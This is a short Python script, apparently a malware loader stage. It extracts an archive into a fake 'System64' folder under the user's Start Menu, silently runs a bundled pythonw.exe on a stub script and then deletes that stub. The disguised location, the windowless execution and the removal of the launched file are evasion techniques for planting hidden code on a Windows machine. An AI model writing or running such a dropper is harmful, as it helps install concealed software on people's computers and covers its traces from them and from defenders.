from shutil import unpack_archive
import subprocess, os
unpack_archive("C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\runtime.zip", "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64")
subprocess.run([f"C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\pythonw.exe", f"C:\\Users\\alex\\AppData\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\stub.pyw"], shell=True, check=True)
os.remove(f"C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System64\\stub.pyw")